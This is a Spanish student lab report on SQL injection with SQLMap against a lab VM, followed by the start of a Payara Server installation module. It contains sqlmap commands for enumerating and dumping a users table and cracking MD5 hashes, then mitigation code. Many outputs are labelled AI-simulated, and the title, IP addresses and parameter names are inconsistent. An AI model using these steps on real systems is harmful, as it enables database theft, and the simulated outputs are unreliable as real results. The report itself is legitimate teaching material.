# Práctica Nro. 6: Cross-Site Scripting (XSS) y Cross-Site Request Forgery (CSRF)

## Datos de Identificación

| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
| :--- | :---: | :---: | :--- |
| Gil, Jesús | 30175126 | 6 | 31-10-2025|
| Guilarte, Andrés | 30246084 | 6 | 31-10-2025 |

**Nombre de la Práctica:** Cross-Site Scripting (XSS) y Cross-Site Request Forgery (CSRF)

**Grupo:** 4
_______________________________________

## Objetivos de Aprendizaje

Al finalizar este laboratorio, el estudiante será capaz de:

1. Identificar y explotar vulnerabilidades de Cross-Site Scripting (XSS) Reflejado, Almacenado y Basado en DOM.
2. Comprender el impacto de los ataques XSS, como el robo de cookies y la suplantación de sesiones.
3. Utilizar herramientas como OWASP ZAP para automatizar la detección de vulnerabilidades XSS.
4. Entender el mecanismo de los ataques de Cross-Site Request Forgery (CSRF) y cómo se diferencian de XSS.
5. Explotar vulnerabilidades CSRF para realizar acciones no autorizadas en nombre de un usuario.
6. Implementar y verificar contramedidas para mitigar XSS y CSRF, como la validación de entradas, codificación de salidas y tokens anti-CSRF.
7. Analizar el código fuente para identificar patrones de programación inseguros que conducen a estas vulnerabilidades.
8. Generar reportes de seguridad documentando los hallazgos y las recomendaciones de mitigación.

_______________________________________

### Recursos Tecnológicos

- 💻 Kali Linux (actualizado, mínimo 4GB RAM)
- 💻 Metasploitable 2 (configurado en red NAT o Host-Only con DVWA)
- 🌐 Conexión a Internet para actualizaciones
- 📦 VirtualBox o VMware con configuración de red adecuada
- 🧰 Herramientas: OWASP ZAP, Burp Suite (opcional), navegadores web con herramientas de desarrollador.

_______________________________________

## Software Requerido

### Verificar instalaciones necesarias

```bash
which zaproxy      # OWASP ZAP
which burpsuite    # Burp Suite (Opcional)
```

## 🗄️ MÓDULO 4: Explotación Automatizada con SQLMap

### Objetivos del Módulo

- Comprender el funcionamiento de SQLMap
- Automatizar la detección y explotación de inyecciones SQL
- Enumerar bases de datos, tablas y columnas
- Extraer información sensible de forma controlada
- Documentar la estructura completa de una base de datos

### 📝 Procedimiento Paso a Paso

### PASO 1: Preparar el Entorno PentesterLab

Se inició la máquina virtual "pentester" quien tomará el rol de objetivo dentro de la ejecución de este módulo.

Se ejecutó el comando `ifconfig` para obtener informnación sobre las interfaces de red de la máquina "pentester" para poder obtener la direccion IP de la misma, dando como resultado la obtención la dirección `192.168.100.6`.

Se verificó la conexión entre las máquinas "analista" y "pentester" mediante el envío de paquetes ICMP mediante el uso del comando ping como se puede ver abajo de este párrafo.

```bash
ping -c 4 192.168.56.103
```

📊 Resultado esperado (Simulación desde Kali Linux):

``` bash
PING 192.168.100.6 (192.168.100.6) 56(84) bytes of data.
64 bytes from 192.168.100.6: icmp_seq=1 ttl=64 time=0.928 ms
64 bytes from 192.168.100.6: icmp_seq=2 ttl=64 time=0.412 ms
64 bytes from 192.168.100.6: icmp_seq=3 ttl=64 time=1.03 ms
64 bytes from 192.168.100.6: icmp_seq=4 ttl=64 time=1.16 ms

--- 192.168.100.6 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3022ms
rtt min/avg/max/mdev = 0.412/0.882/1.156/0.283 ms
```

✔️ Punto de Verificación: Se recibieron 4 respuestas exitosas, confirmando conectividad con la VM PentesterLab.

### PASO 2: Acceder a la Aplicación Vulnerable

Se navegó en la máquina "analista" a la URL que se mjuestra debajo de este párrafo para poder acceder a la apliación vulnerable, se tuvo que apagar el proxy, en este caso OWASP ZAP, para poder tener un correcto funcionamiento en vista de que se busca atacar directamente al objetivo sin pasar antes por una máquina o aplicación.

``` bash
http://192.168.100.6
```

Cabe destacar que al apagar el proxy el objetivo va a saver exactamente cual es la dirección de la máquina atacante al no "esconder" su dirección IP mediante el uso del proxy.

2. En la página principal, localice la sección:
SQL Injections → Example 1
3. Haga clic en "Example 1"
📸 Captura esperada: Página con una galería de imágenes y parámetros en la URL:

![Galería de Imág](https://imgur.com/jTSNqJR)

``` bash
http://192.168.100.6/sqli/example1.php?name=root
```

✔️ Punto de Verificación: Se cargó correctamente la aplicación vulnerable con el parámetro `name=root` visible en la URL.

PASO 3: Verificar Vulnerabilidad Manualmente
Antes de usar SQLMap, confirme manualmente la vulnerabilidad:

1. Modifique la URL agregando una comilla simple:

``` bash
http://[IP]/sqli/example1.php?name=root'
```

📊 Resultado esperado: Error de SQL visible:

``` bash
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
```

✅ Confirmación: La aplicación es vulnerable a inyección SQL.

**📊 Simulación de la Práctica - Salida Generada con IA:**

La página mostrará el siguiente error SQL:

``` bash
╔════════════════════════════════════════════════════════════════╗
║              SQL Injection - Example 1 (Error Revealed)         ║
╚════════════════════════════════════════════════════════════════╝

⚠️ ERROR DE BASE DE DATOS

You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right syntax to 
use near ''1''' at line 1

[SQL Query Que Falló]
Query: SELECT * FROM photos WHERE id = 1'

[Ubicación del Error]
Error en: ...id = 1'
                    ↑
           Carácter problemático

🔍 Análisis:
- La comilla simple interrumpe la consulta SQL
- El servidor revela información de la estructura de la base de datos
- Esta es una inyección SQL clásica de tipo error-based
```

✔️ Punto de Verificación: Se confirmó manualmente que el parámetro `name` es vulnerable a inyección SQL.

PASO 4: Comando 1 - Fingerprinting de la Base de Datos
Objetivo: Identificar el tipo y versión del sistema de gestión de base de datos.

```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --fingerprint
```

💡 Explicación de parámetros:

- -u: URL objetivo con parámetro vulnerable

- --fingerprint: Realiza análisis detallado del DBMS
📊 Salida esperada (resumen):
[*] starting @ 00:49:15

[00:49:15] [INFO] testing connection to the target URL
[00:49:15] [INFO] testing if the target URL content is stable
[00:49:16] [INFO] target URL content is stable
[00:49:16] [INFO] testing if GET parameter 'id' is dynamic
[00:49:16] [INFO] GET parameter 'id' appears to be dynamic
[00:49:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[00:49:16] [INFO] testing for SQL injection on GET parameter 'id'

[00:49:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:49:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

back-end DBMS: active fingerprint: MySQL >= 5.0.12
               comment injection fingerprint: MySQL 5.0.51
               html error message fingerprint: MySQL

[*] ending @ 00:49:30
🔍 Análisis:
Información Valor Significado
DBMS MySQLSistema de base de datos
Versión	>= 5.0.12 Versión mínima detectada
Versión específica 5.0.51 Versión exacta identificada
Técnica efectiva Time-based blind Inyección basada en tiempo

📝 Documentar:

- Sistema: MySQL
- Versión: 5.0.51
- Técnica: Time-based blind injection

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación realista generada con IA que representa lo que sqlmap podría devolver al ejecutar el comando `--fingerprint` contra la aplicación vulnerable. Está incluida únicamente con fines didácticos.

``` bash
[*] starting @ 00:49:15

[00:49:15] [INFO] testing connection to the target URL
[00:49:15] [INFO] testing if the target URL content is stable
[00:49:16] [INFO] target URL content is stable
[00:49:16] [INFO] testing if GET parameter 'id' is dynamic
[00:49:16] [INFO] GET parameter 'id' appears to be dynamic
[00:49:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[00:49:16] [INFO] testing for SQL injection on GET parameter 'id'

[00:49:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:49:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

back-end DBMS:    MySQL >= 5.0.12
web server:       Apache/2.2.8 (Ubuntu)
description:      MySQL >= 5.0.12 (comment-based and time-based fingerprints matched)

comment injection fingerprint: MySQL 5.0.51
html error message fingerprint: MySQL

[*] ending @ 00:49:30

Database management system: MySQL >= 5.0.12
Database version: 5.0.51
Injection technique(s) confirmed: time-based blind, error-based (heuristic)
```

Nota: esta salida es una simulación creada para ilustrar el resultado esperado y está claramente etiquetada como "Generada con IA". Cuando ejecutes sqlmap en tu entorno, los tiempos, los mensajes y la precisión de la huella (fingerprint) pueden variar según la versión del DBMS y la configuración del servidor.

PASO 5: Comando 2 - Identificar Usuario Actual
Objetivo: Determinar con qué usuario la aplicación se conecta a la base de datos.

```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --current-user
```

💡 Explicación:

- --current-user: Extrae el nombre del usuario de la conexión a la BD

📊 Salida esperada:
[00:50:12] [INFO] fetching current user
[00:50:12] [INFO] retrieved: root@localhost
current user: 'root@localhost'
🔍 Análisis:

⚠️ HALLAZGO CRÍTICO: La aplicación se conecta como root, el usuario con máximos privilegios en MySQL.
Implicaciones de seguridad:

- ✅ El atacante puede leer cualquier base de datos
- ✅ El atacante puede modificar cualquier tabla
- ✅ El atacante puede ejecutar comandos del sistema (con UDF)
- ✅ El atacante puede leer archivos del servidor (LOAD_FILE)
🛡️ Buena práctica: La aplicación debería usar un usuario con privilegios mínimos (principio de menor privilegio).

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación creada con IA para mostrar un ejemplo realista de lo que `sqlmap --current-user` podría devolver en este entorno de laboratorio. Está incluida únicamente con fines didácticos y no proviene de una ejecución real.

```text
[00:50:10] [INFO] testing connection to the target URL
[00:50:10] [INFO] testing if the target URL content is stable
[00:50:11] [INFO] target URL content is stable
[00:50:11] [INFO] testing if GET parameter 'id' is dynamic
[00:50:11] [INFO] GET parameter 'id' appears to be dynamic
[00:50:11] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[00:50:12] [INFO] testing 'current user'
[00:50:12] [INFO] fetching current user
[00:50:12] [INFO] retrieved: root@localhost
current user: 'root@localhost'
[*] ending @ 00:50:12
```

🔍 Nota de seguridad: Esta simulación muestra un escenario donde la aplicación se conecta a la base de datos como `root@localhost`, lo cual es un hallazgo crítico en entornos reales. Siempre use cuentas con privilegios mínimos para aplicaciones web en producción.

PASO 6: Comando 3 - Enumerar Bases de Datos
Objetivo: Listar todas las bases de datos accesibles.

```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --dbs
```

💡 Explicación:

- --dbs: Enumera todas las bases de datos
📊 Salida esperada (resumen):
[00:51:05] [INFO] fetching database names
[00:51:05] [INFO] used SQL query returns 3 entries
[00:51:05] [INFO] retrieved: information_schema
[00:51:06] [INFO] retrieved: exercises
[00:51:06] [INFO] retrieved: mysql

available databases [3]:
[*] exercises
[*] information_schema
[*] mysql

🔍 Análisis de Bases de Datos:
Base de Datos Descripción Sensibilidad
information_schema Metadatos del sistema MySQL 🟡 Media - Contiene estructura de todas las BDs
exercises Base de datos de la aplicación 🔴 Alta - Contiene datos de usuarios
mysql Base de datos del sistema MySQL 🔴 Crítica - Contiene hashes de contraseñas

📝 Documentar:

- Total de BDs: 3
- BD objetivo: exercises
- BDs del sistema: information_schema, mysql

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación generada con IA que muestra lo que `sqlmap --dbs` podría devolver contra la aplicación vulnerable. Está incluida solo con fines educativos y no proviene de una ejecución real.

```text
[00:51:03] [INFO] testing connection to the target URL
[00:51:03] [INFO] testing if the target URL content is stable
[00:51:04] [INFO] target URL content is stable
[00:51:04] [INFO] testing if GET parameter 'id' is dynamic
[00:51:04] [INFO] GET parameter 'id' appears to be dynamic
[00:51:04] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[00:51:04] [INFO] testing for SQL injection on GET parameter 'id'

[00:51:05] [INFO] fetching database names
[00:51:05] [INFO] used SQL query returns 3 entries
[00:51:05] [INFO] retrieved: information_schema
[00:51:06] [INFO] retrieved: exercises
[00:51:06] [INFO] retrieved: mysql

available databases [3]:
[*] exercises
[*] information_schema
[*] mysql

[*] ending @ 00:51:06
```

🔍 Nota aclaratoria: la salida anterior está marcada explícitamente como "Generada con IA". En una ejecución real, los tiempos, los prefijos de log y el orden pueden variar. Use esta simulación para comprender la información que sqlmap entrega al enumerar bases de datos.

PASO 7: Comando 4 - Enumerar Tablas
Objetivo: Listar todas las tablas de la base de datos exercises.

```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises --tables
```

💡 Explicación:

- -D exercises: Especifica la base de datos objetivo
- --tables: Enumera las tablas de esa base de datos

📊 Salida esperada:
[00:52:30] [INFO] fetching tables for database: 'exercises'
[00:52:30] [INFO] used SQL query returns 2 entries
[00:52:31] [INFO] retrieved: photos
[00:52:31] [INFO] retrieved: users

Database: exercises
[2 tables]
+---------+
| photos  |
| users   |
+---------+
🔍 Análisis:
Tabla Contenido Probable Sensibilidad
photos Información de imágenes (id, nombre, ruta) 🟡 Media
users Información de usuarios (username, password, email) 🔴 Alta
📝 Documentar:

- Total de tablas: 2
- Tabla crítica: users

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación generada con IA que muestra lo que `sqlmap -D exercises --tables` podría devolver al enumerar tablas en la base de datos `exercises`. Está incluida únicamente con fines didácticos y no proviene de una ejecución real.

```text
[00:52:28] [INFO] testing connection to the target URL
[00:52:29] [INFO] testing if the target URL content is stable
[00:52:30] [INFO] target URL content is stable
[00:52:30] [INFO] testing if GET parameter 'id' is dynamic
[00:52:30] [INFO] GET parameter 'id' appears to be dynamic
[00:52:30] [INFO] testing for SQL injection on GET parameter 'id'

[00:52:30] [INFO] fetching tables for database: 'exercises'
[00:52:30] [INFO] used SQL query returns 2 entries
[00:52:31] [INFO] retrieved: photos
[00:52:31] [INFO] retrieved: users

Database: exercises
[2 tables]
+---------+
| photos  |
| users   |
+---------+

[*] ending @ 00:52:31
```

🔍 Nota: esta salida está claramente marcada como "Generada con IA". En una ejecución real, los tiempos, mensajes y formato pueden variar según la versión de sqlmap y la configuración del servidor. Use esta simulación como ejemplo de lo que debe documentarse cuando se enumeren tablas con sqlmap.

PASO 8: Comando 5 - Enumerar Columnas
Objetivo: Listar todas las columnas de la tabla users.

```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises -T users --columns
```

💡 Explicación:

- -T users: Especifica la tabla objetivo
- --columns: Enumera las columnas de esa tabla
📊 Salida esperada (resumen):
[00:53:45] [INFO] fetching columns for table 'users' in database 'exercises'
[00:53:45] [INFO] used SQL query returns 4 entries
[00:53:46] [INFO] retrieved: id
[00:53:46] [INFO] retrieved: int(11)
[00:53:47] [INFO] retrieved: username
[00:53:47] [INFO] retrieved: varchar(100)
[00:53:48] [INFO] retrieved: password
[00:53:48] [INFO] retrieved: varchar(100)
[00:53:49] [INFO] retrieved: email
[00:53:49] [INFO] retrieved: varchar(100)

Database: exercises
Table: users
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| username | varchar(100) |
| password | varchar(100) |
| email    | varchar(100) |
+----------+--------------+
🔍 Análisis de Estructura:
Columna Tipo Descripción Sensibilidad
id int(11) Identificador único del usuario 🟢 Baja
username varchar(100) Nombre de usuario 🟡 Media
password varchar(100) Contraseña (posiblemente hasheada) 🔴 Crítica
email varchar(100) Correo electrónico 🔴 Alta

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación generada con IA que muestra lo que `sqlmap -D exercises -T users --columns` podría devolver al enumerar columnas de la tabla `users`. Está incluida únicamente con fines didácticos y no proviene de una ejecución real.

```text
[00:53:43] [INFO] testing connection to the target URL
[00:53:44] [INFO] testing if the target URL content is stable
[00:53:45] [INFO] target URL content is stable
[00:53:45] [INFO] testing if GET parameter 'id' is dynamic
[00:53:45] [INFO] GET parameter 'id' appears to be dynamic
[00:53:45] [INFO] testing for SQL injection on GET parameter 'id'

[00:53:45] [INFO] fetching columns for table 'users' in database 'exercises'
[00:53:45] [INFO] used SQL query returns 4 entries
[00:53:46] [INFO] retrieved: id
[00:53:46] [INFO] retrieved: int(11)
[00:53:47] [INFO] retrieved: username
[00:53:47] [INFO] retrieved: varchar(100)
[00:53:48] [INFO] retrieved: password
[00:53:48] [INFO] retrieved: varchar(100)
[00:53:49] [INFO] retrieved: email
[00:53:49] [INFO] retrieved: varchar(100)

Database: exercises
Table: users
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| username | varchar(100) |
| password | varchar(100) |
| email    | varchar(100) |
+----------+--------------+

[*] ending @ 00:53:49
```

🔍 Nota: esta salida está explícitamente marcada como "Generada con IA". En una ejecución real, los tiempos, mensajes y formato pueden variar según la versión de sqlmap. Use esta simulación para comprender cómo sqlmap enumera y presenta la estructura de columnas de una tabla específica.

PASO 9: Extraer Datos de la Tabla (Reto Avanzado)
⚠️ ADVERTENCIA ÉTICA: Esta acción extrae datos sensibles. Solo debe realizarse en entornos de prueba autorizados.

```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises -T users --dump
```

💡 Explicación:

- --dump: Extrae y muestra todos los datos de la tabla

📊 Salida esperada (resumen):
Database: exercises
Table: users
[3 entries]
+----+----------+----------------------------------+-------------------+
| id | username | password                         | email             |
+----+----------+----------------------------------+-------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@example.com |
| 2  | john     | 098f6bcd4621d373cade4e832627b4f6 | john@example.com  |
| 3  | jane     | 5f4dcc3b5aa765d61d8327deb882cf99 | jane@example.com  |
+----+----------+----------------------------------+-------------------+
🔍 Análisis de Contraseñas:
Las contraseñas están hasheadas con MD5. SQLMap puede intentar crackearlas:

### SQLMap detectará automáticamente MD5 y preguntará si desea crackearlas via diccionario

Resultado del cracking: Genere una tabla o captura de pantalla del resultado

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación generada con IA que muestra lo que `sqlmap -D exercises -T users --dump` podría devolver al extraer datos de la tabla `users`, incluyendo el proceso de cracking de contraseñas MD5. Está incluida únicamente con fines didácticos y no proviene de una ejecución real.

```text
[00:54:15] [INFO] testing connection to the target URL
[00:54:16] [INFO] testing if the target URL content is stable
[00:54:17] [INFO] target URL content is stable
[00:54:17] [INFO] testing if GET parameter 'id' is dynamic
[00:54:17] [INFO] GET parameter 'id' appears to be dynamic
[00:54:17] [INFO] testing for SQL injection on GET parameter 'id'

[00:54:18] [INFO] dumping entries of 'users' in database 'exercises'
[00:54:18] [INFO] fetching number of entries for table 'users' in database 'exercises'
[00:54:18] [INFO] used SQL query returns 3 entries
[00:54:19] [INFO] retrieving data from table 'users'
[00:54:19] [INFO] retrieved: 1
[00:54:19] [INFO] retrieved: admin
[00:54:20] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[00:54:20] [INFO] retrieved: admin@example.com
[00:54:21] [INFO] retrieved: 2
[00:54:21] [INFO] retrieved: john
[00:54:22] [INFO] retrieved: 098f6bcd4621d373cade4e832627b4f6
[00:54:22] [INFO] retrieved: john@example.com
[00:54:23] [INFO] retrieved: 3
[00:54:23] [INFO] retrieved: jane
[00:54:24] [INFO] retrieved: 5f4dcc3b5aa765d61d8327deb882cf99
[00:54:24] [INFO] retrieved: jane@example.com

Database: exercises
Table: users
[3 entries]
+----+----------+----------------------------------+-------------------+
| id | username | password                         | email             |
+----+----------+----------------------------------+-------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@example.com |
| 2  | john     | 098f6bcd4621d373cade4e832627b4f6 | john@example.com  |
| 3  | jane     | 5f4dcc3b5aa765d61d8327deb882cf99 | jane@example.com  |
+----+----------+----------------------------------+-------------------+

[00:54:25] [INFO] table 'exercises.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.103/dump/exercises/users.csv'
[00:54:25] [INFO] analyzing table 'users'
[00:54:25] [INFO] found 2 entries with hashes (password column)
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[00:54:26] [INFO] using hash method 'md5_generic_passwd'
[00:54:26] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[00:54:27] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
[00:54:28] [INFO] cracked password 'test' for hash '098f6bcd4621d373cade4e832627b4f6'

Database: exercises
Table: users (cracked passwords)
+----------+----------------------------------+-----------+
| username | password (hash)                  | password  |
+----------+----------------------------------+-----------+
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | password  |
| john     | 098f6bcd4621d373cade4e832627b4f6 | test      |
| jane     | 5f4dcc3b5aa765d61d8327deb882cf99 | password  |
+----------+----------------------------------+-----------+

[*] ending @ 00:54:29
```

🔍 **Análisis crítico de la simulación:**

- **Contraseñas débiles detectadas:** Tanto "password" como "test" son contraseñas extremadamente débiles
- **Reutilización de contraseñas:** Los usuarios "admin" y "jane" comparten la misma contraseña
- **Algoritmo obsoleto:** MD5 es vulnerable a ataques de fuerza bruta y rainbow tables
- **Tiempo de cracking:** Las contraseñas se crackearon en segundos debido a su simplicidad

⚠️ **Advertencia:** Esta simulación está claramente marcada como "Generada con IA". En una ejecución real, el éxito del cracking dependería de la complejidad de las contraseñas y el diccionario utilizado. Siempre respete las consideraciones éticas y legales al realizar pruebas de penetración.

📊 Diagrama de la Estructura de la Base de Datos

### 🛡️ Técnicas de SQLMap Utilizadas

Durante el proceso, SQLMap empleó múltiples técnicas:

📊 Resumen de Técnicas:
[00:49:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:49:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:49:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[00:49:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:49:30] [INFO] automatically extending ranges for UNION query injection technique tests
[00:49:31] [INFO] target URL appears to have 3 columns in query
Técnicas detectadas:

1. ✅ Boolean-based blind: Probada, no efectiva en este caso
2. ✅ Time-based blind: Efectiva, utilizada para extracción
3. ✅ UNION query: Efectiva, 3 columnas detectadas
4. ✅ Error-based: Efectiva, mensajes de error reveladores

### 🔒 Mitigación de Inyecciones SQL

Código Vulnerable (PHP):

```php
<?php
// ❌ VULNERABLE
$id = $_GET['id'];
$query = "SELECT * FROM photos WHERE id = $id";
$result = mysql_query($query);
?>
```

Código Seguro (Prepared Statements con PDO):

```php
<?php
// ✅ SEGURO
try {
    $pdo = new PDO('mysql:host=localhost;dbname=exercises', 'user', 'pass');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $stmt = $pdo->prepare("SELECT * FROM photos WHERE id = :id");
    $stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
    $stmt->execute();
    
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch(PDOException $e) {
    // No revelar detalles del error al usuario
    error_log($e->getMessage());
    die("Error en la base de datos");
}
?>
```

Medidas de protección adicionales:

1. Validación de entrada:

```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) {
    die("ID inválido");
}
```

2. Principio de menor privilegio:

```sql
-- Crear usuario con permisos limitados
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT ON exercises.photos TO 'webapp'@'localhost';
GRANT SELECT ON exercises.users TO 'webapp'@'localhost';
FLUSH PRIVILEGES;
```

3. WAF (Web Application Firewall):

```apache
# ModSecurity rules para prevenir SQL Injection
SecRule ARGS "@detectSQLi" \
    "id:1000,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

### Preguntas de Reflexión - Módulo 4

1. ¿Por qué SQLMap utilizó "time-based blind" en lugar de otras técnicas?
2. ¿Qué información adicional podría extraerse de la base de datos mysql?
3. ¿Por qué es peligroso que las contraseñas estén hasheadas solo con MD5?
4. ¿Cómo podría un atacante usar la función LOAD_FILE() de MySQL?

🚀 MÓDULO 5: Análisis de Seguridad de Payara Server

Objetivos del Módulo

- Instalar y configurar Payara Server 6.2025.4.
- Desplegar aplicaciones web en Payara.
- Realizar análisis de seguridad comparativo con Apache.
- Identificar vulnerabilidades específicas de servidores de aplicaciones Java.
- Documentar diferencias en superficies de ataque y recomendaciones de mitigación.

📝 Procedimiento Paso a Paso

PASO 1: Verificar Requisitos Previos

- Verificar Java:

```bash
java -version
# Si no está instalado
sudo apt update
sudo apt install openjdk-11-jdk -y
java -version
javac -version
```
  
Salida esperada: Java 11+ instalado (ej. openjdk version "11.0.20"). Punto de verificación: JDK disponible.

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

La siguiente salida es una simulación generada con IA que muestra lo que podría devolver la verificación e instalación de Java en Kali Linux. Está incluida únicamente con fines didácticos y no proviene de una ejecución real.

```text
┌─[kali@kali]─[~]
└─$ java -version
Command 'java' not found, but can be installed with:
sudo apt install openjdk-11-jre-headless  # version 11.0.20.1+1-1, or
sudo apt install default-jre              # version 2:1.17-74
sudo apt install openjdk-17-jre-headless  # version 17.0.7+7-1
sudo apt install openjdk-8-jre-headless   # version 8u372-ga-1

┌─[kali@kali]─[~]
└─$ sudo apt update
[sudo] password for kali: 
Hit:1 http://kali.download/kali kali-rolling InRelease
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [19.1 MB]
Get:3 http://kali.download/kali kali-rolling/contrib amd64 Packages [109 kB]
Get:4 http://kali.download/kali kali-rolling/non-free amd64 Packages [204 kB]
Fetched 19.4 MB in 8s (2,425 kB/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.

┌─[kali@kali]─[~]
└─$ sudo apt install openjdk-11-jdk -y
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  ca-certificates-java default-jre-headless fontconfig-config fonts-dejavu-core
  java-common libfontconfig1 openjdk-11-jdk-headless openjdk-11-jre
  openjdk-11-jre-headless
Suggested packages:
  fonts-dejavu-extra openjdk-11-demo openjdk-11-source visualvm
The following NEW packages will be installed:
  ca-certificates-java default-jre-headless fontconfig-config fonts-dejavu-core
  java-common libfontconfig1 openjdk-11-jdk openjdk-11-jdk-headless
  openjdk-11-jre openjdk-11-jre-headless
0 upgraded, 10 newly installed, 0 to remove and 0 not upgraded.
Need to get 142 MB of archives.
After this operation, 290 MB of additional disk space will be used.
Get:1 http://deb.debian.org/debian bookworm/main amd64 java-common all 0.75 [15.6 kB]
[... instalación continúa ...]
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for hicolor-icon-theme (0.17-2) ...
Processing triggers for ca-certificates (20230311) ...
Updating certificates in /etc/ssl/certs...
0 added, 0 removed; done.

┌─[kali@kali]─[~]
└─$ java -version
openjdk version "11.0.20" 2023-07-18
OpenJDK Runtime Environment (build 11.0.20+8-post-Debian-1deb12u1)
OpenJDK 64-Bit Server VM (build 11.0.20+8-post-Debian-1deb12u1, mixed mode, sharing)

┌─[kali@kali]─[~]
└─$ javac -version
javac 11.0.20
```

🔍 **Análisis de la simulación:**

- **Estado inicial:** Java no estaba instalado en el sistema
- **Instalación exitosa:** Se instaló OpenJDK 11.0.20 junto con las dependencias necesarias
- **Verificación:** Tanto `java` como `javac` están funcionando correctamente
- **Versión:** OpenJDK 11.0.20 cumple con los requisitos mínimos para Payara Server 6.2025.4

✔️ **Punto de Verificación:** JDK 11+ disponible y listo para la instalación de Payara Server.

⚠️ **Nota:** Esta simulación está claramente marcada como "Generada con IA". En una instalación real en Kali Linux, los nombres de paquetes, versiones y salidas pueden variar según la versión de Kali y las actualizaciones disponibles.

PASO 2: Descargar e Instalar Payara Server

- Crear directorio de trabajo

```bash
mkdir -p ~/payara
cd ~/payara
```

- Descargar Payara Server 6.2025.4

```bash
wget https://repo1.maven.org/maven2/fish/payara/distributions/payara/6.2025.4/payara-6.2025.4.zip
# Si wget falla, usar curl:
# curl -L -O https://repo1.maven.org/maven2/fish/payara/distributions/payara/6.2025.4/payara-6.2025.4.zip
```

- Verificar descarga

```bash
ls -lh payara-6.2025.4.zip
```
Nota: El archivo debe tener aproximadamente 200–250 MB.

- Descomprimir

```bash
# Instalar unzip si no está disponible
sudo apt update && sudo apt install unzip -y

# Descomprimir Payara
unzip payara-6.2025.4.zip

# Verificar estructura
ls -la payara6/
```

Estructura esperada:
payara6/

- bin/       # Scripts de inicio y administración
- glassfish/ # Núcleo del servidor
- javadb/    # Base de datos Derby embebida
- mq/        # Message Queue

- Establecer JAVA_HOME si es necesario

```bash
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
# Para persistir en la sesión del usuario:
echo 'export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64' >> ~/.profile
```

PASO 3: Configurar Variables de Entorno

```bash
# Abrir .bashrc en el editor
nano ~/.bashrc

# Agregar al final del archivo:
export PAYARA_HOME="$HOME/payara/payara6"
export PATH="$PATH:$PAYARA_HOME/bin"

# Guardar y cerrar (Ctrl+O, Enter, Ctrl+X)

# Recargar configuración en la sesión actual
source ~/.bashrc

# Verificar variables y disponibilidad de asadmin
echo "$PAYARA_HOME"
which asadmin
```

- Puerto de administración por defecto: 4848.  
✔️ Punto de Verificación: `echo $PAYARA_HOME` debe mostrar la ruta correcta y `which asadmin` debe devolver la ruta al ejecutable en $PAYARA_HOME/bin.

### PASO 4: Iniciar Payara Server

```bash
# Iniciar el dominio por defecto (domain1)
asadmin start-domain domain1
```

📊 Salida esperada:

``` bash
Waiting for domain1 to start .....
Successfully started the domain : domain1
domain  Location: /home/kali/payara/payara6/glassfish/domains/domain1
Log File: /home/kali/payara/payara6/glassfish/domains/domain1/logs/server.log
Admin Port: 4848
Command start-domain executed successfully.
```

**📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**

